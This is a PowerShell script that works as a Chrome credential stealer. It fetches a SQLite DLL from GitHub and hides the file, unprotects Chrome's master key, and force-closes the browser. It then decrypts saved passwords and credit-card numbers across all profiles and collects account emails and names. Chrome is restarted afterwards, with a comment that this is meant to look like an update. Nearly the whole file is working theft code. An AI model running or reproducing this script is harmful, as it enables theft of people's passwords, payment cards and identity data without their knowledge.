#***OPTION***

#only show the password that have url origine and a password at least 
$only_Show_Valide=$true #set to false by default
#hide the password
$hide=$true #set to false by default
Add-Type -Path "C:\Users\$env:USERNAME\System.Data.SQLite.dll"


#add nuget install and force 

#test if powershell 7 is installed 
if(-not (Test-Path "C:\Program Files\PowerShell\7")){
    Install-Module -Name PowerShellGet -Force -AllowClobber
    winget install --id Microsoft.Powershell --source winget
    [System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Program Files\PowerShell\7", [System.EnvironmentVariableTarget]::Machine) #potentialy optional
}
else{
Write-Host "Powershell 7 is already installed"
}

#check if the sql dll is installed
if(Test-Path "C:\Users\$env:USERNAME\System.Data.SQLite.dll"){
Write-Host "the dll for sql are already installed"
}
else{#install sql dll
Invoke-WebRequest -Uri "https://github.com/Desnyt628/download/raw/refs/heads/main/System.Data.SQLite.dll" -OutFile "C:\Users\$env:USERNAME\System.Data.SQLite.dll" #modifier laddress pour trouver le dll de sql
Set-ItemProperty -Path "C:\Users\$env:USERNAME\System.Data.SQLite.dll" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
}

#fetch and decrypte the master key
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$chromeState = Get-Content $chromePath -Raw | ConvertFrom-Json
$masterKeyBase64 = $chromeState.os_crypt.encrypted_key
$byteArray = [System.Convert]::FromBase64String($masterKeyBase64)
$modifiedArray = $byteArray[5..($byteArray.Length - 1)]
Add-Type -AssemblyName System.Security
$decryptedMasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($modifiedArray, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

$passwordfound=0

function Decrypt {
    param (
        # Define parameters here
        [byte[]]$decryptedMasterKey,
        [byte[]]$encryptedPassword,
        [ref]$errorOccurred,
        [bool]$hide=$false
    )

        #byte
        $IV = $encryptedPassword[3..14]
        $Password = $encryptedPassword[15..($encryptedPassword.Length - 17)]
        $tag =$encryptedPassword[-16..-1]


        #base64
        $base64decryptedMasterKey = [Convert]::ToBase64String($decryptedMasterKey)
        $base64IV = [Convert]::ToBase64String($IV)
        $base64Password = [Convert]::ToBase64String($Password)
        $base64tag = [Convert]::ToBase64String($tag)

        $command=@"
        Add-Type -AssemblyName System.Security
        `$decryptedMasterKey="$base64decryptedMasterKey"
        `$IV="$base64IV"
        `$Password="$base64Password"
        `$tag="$base64tag"

        #base64
        `$decryptedMasterKey = [Convert]::FromBase64String(`$decryptedMasterKey)
        `$IV = [Convert]::FromBase64String(`$IV)
        `$Password = [Convert]::FromBase64String(`$Password)
        `$tag = [Convert]::FromBase64String(`$tag)

    
        `$decryptedBytes = New-Object byte[] (`$Password.Length)


        `$aesGcm = [System.Security.Cryptography.AesGcm]::new(`$decryptedMasterKey)
        `$aesGcm.Decrypt(`$IV,`$Password,`$tag, `$decryptedBytes)
        `$decryptedText = [System.Text.Encoding]::UTF8.GetString(`$decryptedBytes)


        

        return [System.Text.Encoding]::UTF8.GetString(`$decryptedBytes)
"@

    
        $commandBytes = [System.Text.Encoding]::Unicode.GetBytes($command)  # Converts text to bytes
        $commandBase64 = [Convert]::ToBase64String($commandBytes)  # Converts bytes to Base64

        #catch if the password really exist
        
        
        $passwordPlainText = & "C:\Program Files\PowerShell\7\pwsh.exe" -EncodedCommand $commandBase64 2>&1
        
        $passwordPlainText = $passwordPlainText -split "`n"
        if ($passwordPlainText.Length -gt 1) {
        $passwordPlainText="no Password associated to the website $urlOrigine"
        $errorOccurred.Value = $true
        $errorOccurred.Value
        }
        if(($errorOccurred.Value -eq $false) -and ($hide)){#hide the password
        $passwordPlainText="$passwordPlainText"
        $passwordPlainText = $passwordPlainText[($passwordPlainText.Length -4)..($passwordPlainText.Length -2)]
        $passwordPlainText = -join $passwordPlainText
        $passwordPlainText="*****${passwordPlainText}*"
        }
        return $passwordPlainText
}




function password {
    param (
        # Define parameters here
        [string]$pathToLog,
        [ref]$passwordfound,
        [bool]$onlyShowValide=$false
    )

    #check if chrome is installed
    if((test-path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State") -and (test-path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){

        #SQL handler
        $chrome = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
        if($chrome){#apply only if chrome is open
        Stop-Process -Name "chrome" -Force #close chrome so the db isnt blocked###############################################debug
        Start-Sleep -Seconds 1 #wait for the database to close
        }
        Add-Type -Path "C:\Users\$env:USERNAME\System.Data.SQLite.dll"
        $connectionString = "Data Source=$pathToLog;Version=3;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()

        #SQL command
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT origin_url,action_url, username_value, password_value FROM logins"
        $reader = $command.ExecuteReader()

        $chrome_found=0
        $i=0
        #reader
        while ($reader.Read()) {
            $i++
            $urlOrigine = $reader.GetString(0)
            $urlAction = $reader.GetString(1)
            $username = $reader.GetString(2)
            $encryptedPassword = $reader.GetValue(3)
        
           
            $errorOccurred = $false
            $passwordPlainText = Decrypt -decryptedMasterKey $decryptedMasterKey -encryptedPassword $encryptedPassword -errorOccurred ([ref]$errorOccurred) -hide $hide
            
            

            if($errorOccurred -eq $true){
            $passwordPlainText="no Password associated to the website $urlOrigine"
            }
            else{
            $chrome_found++
            }



            if (-not $onlyShowValide) {
                # Show everything, regardless of error
                $showoutput = $true
            } elseif ($onlyShowValide -and !$errorOccurred) {
                # Show output only if there are no errors
                $showoutput = $true
            } else {
                # Do not show output if there's an error and onlyShowtheonethatarenoterrore is true
                $showoutput = $false
            }

            if($showoutput){
         
                # Output the results
                Write-Host "`r`naccount #$i"
                        if($errorOccurred){
                write-host "no real account associated"
                }
                Write-Host "URL_Origin: $urlOrigine"
                Write-Host "URL_Action: $urlAction"
                Write-Host "Username: $username"
                Write-Host "Password: $passwordPlainText"
                Write-Host "----------------------------"

            }
        }
        $reader.Close()
        $connection.Close()
        
        $passwordfound.Value =$chrome_found
        Write-Host "$chrome_found Password found for this user`r`n--------------------------------------------------------"
    }
}





function accountInfo {
    param (
        # Define parameters here
        [string]$pathTopreference
    )
    
    #Bookmarks
    # Path to the Preferences file for the specified profile
    $preferencesFile = "$pathTopreference\Preferences"

    # Check if the file exists
    if (Test-Path $preferencesFile) {
        # Read the Preferences file
        $preferencesContent = Get-Content $preferencesFile -Raw | ConvertFrom-Json
        return $preferencesContent
    } else {
        Write-Output "Preferences file not found for profile: $profileName"
    }
}



function creditinfo {
    param (
        # Define parameters here
        [string]$pathTopreference
    )
    Add-Type -Path "C:\Users\$env:USERNAME\System.Data.SQLite.dll"
    # Path to the Web Data database
    $dbPath = "$pathTopreference\Web Data"

    # Create a new SQLite connection
    $connection = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dbPath;Version=3;")
    $connection.Open()

    # Query to get credit card information
    $command = $connection.CreateCommand()
    $command.CommandText = "SELECT * FROM credit_cards"

    # Execute the command
    $reader = $command.ExecuteReader()
    $encryptednumber=$null#$null
    # Read the data
    $creditArray = @()
    while ($reader.Read()) {
        $cardName = $reader.GetString(1)
        $expiration_month=$reader.GetValue(2)
        $expiration_year=$reader.GetValue(3)
        $encryptednumber=$reader.GetValue(4)
        


        # Clean up

        if(-not ($encryptednumber -eq $null)){
        $errorOccurred = $false
        $passwordPlainText = Decrypt -decryptedMasterKey $decryptedMasterKey -encryptedPassword $encryptednumber -errorOccurred ([ref]$errorOccurred) -hide $hide
        }


        $credit = [PSCustomObject]@{
            passwordPlainText=$passwordPlainText
            nameOnCard =$cardName
            expiration_month=$expiration_month
            expiration_year =$expiration_year
        }
        $creditArray += $credit
        }
    $creditfound=$creditArray|Select-Object -first 1
    if ($creditfound.nameOnCard -eq $null){#if no credit found
    return "no credit card found for this account"
    }
    $reader.Close()
    $connection.Close()
    return ,$creditArray
    }




$nbCreditCard=0
$pwTotal=0

#default account

$accountinfo1 = accountInfo -pathTopreference "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$picture_url=$accountinfo1.account_info.picture_url
"`r`n`r`nprofilepicture: $picture_url"
$email=$accountinfo1.account_info.email
"email: $email"
$full_name=$accountinfo1.account_info.full_name
"full name: $full_name"

$creditInfo=creditinfo -pathTopreference "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$creditInfo|Out-String



password -pathToLog "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -passwordfound ([ref]$passwordfound) -onlyShowValide $only_Show_Valide
    #show how many credit card found if any
    if(-not($creditInfo -eq "no credit card found for this account")){
        $nbCreditCard+=$creditInfo.Length
        $creditlenght=$creditInfo.Length
        write-host "`r`n$creditlenght credit card found for this user`r`n--------------------------------------------------------"
    }
    else{
    write-host "no credit card found for this user`r`n--------------------------------------------------------"
    }
    if($email -eq $null){
    $email="no mail account associated"
    }
    Write-Host "end of account for $email`r`n--------------------------------------------------------`r`n--------------------------------------------------------"
$pwTotal+=$passwordfound
$profileNB = 1


#try if there is other account
while(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile $profileNB\Login Data"){


    #account info
    $accountinfo1 = accountInfo -pathTopreference "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile $profileNB"
    $picture_url=$accountinfo1.account_info.picture_url
    "`r`n`r`nprofilepicture: $picture_url"
    $email=$accountinfo1.account_info.email
    "email: $email"
    $full_name=$accountinfo1.account_info.full_name
    "full name: $full_name"

    #creditinfo
    $creditInfo=creditinfo -pathTopreference "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile $profileNB"
    $creditInfo|Out-String
    
    

    #path for login Data
    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile $profileNB\Login Data"
    password -pathToLog $path -passwordfound ([ref]$passwordfound) -onlyShowValide $only_Show_Valide

    #show how many credit card found if any
    if(-not($creditInfo -eq "no credit card found for this account")){
        $nbCreditCard+=$creditInfo.Length
        $creditlenght=$creditInfo.Length
        write-host "`r`n$creditlenght credit card found for this user`r`n--------------------------------------------------------"
    }
    else{
    write-host "no credit card found for this user`r`n--------------------------------------------------------"
    }

    if($email -eq $null){
    $email="no mail account associated"
    }

    Write-Host "end of account for $email`r`n--------------------------------------------------------`r`n--------------------------------------------------------"

    $pwTotal+=$passwordfound
    $profileNB++
}
Start-Process "chrome.exe"#restart chrome so it seems like an update or somthing like that 
Write-Host "password total=$pwTotal `r`nnumber of profile:$profileNB `r`nnumber of credit card found: $nbCreditCard"
#says the total of account and the total of password found
